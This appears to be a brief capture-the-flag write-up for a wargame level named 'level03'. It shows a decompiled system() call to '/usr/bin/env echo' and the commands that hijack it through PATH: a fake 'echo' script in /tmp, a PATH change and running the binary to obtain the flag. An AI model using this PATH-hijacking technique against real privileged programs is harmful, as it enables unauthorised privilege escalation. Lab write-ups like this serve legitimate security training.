A binary file is in our home.
We disassemble the bin using https://dogbolt.org/ .

```c
return system("/usr/bin/env echo Exploit me");
```
We can exploit this line by creating a bash [script named echo](./echo) that will use the `getflag` command.

We make this script executable
```bash
chmod +x /tmp/echo
```
Then we set the `PATH` so that the bash script we just created can be executed.
```bash
export PATH=/tmp/:$PATH
```
Finally we can just run the `level03` program
```bash
./level03
```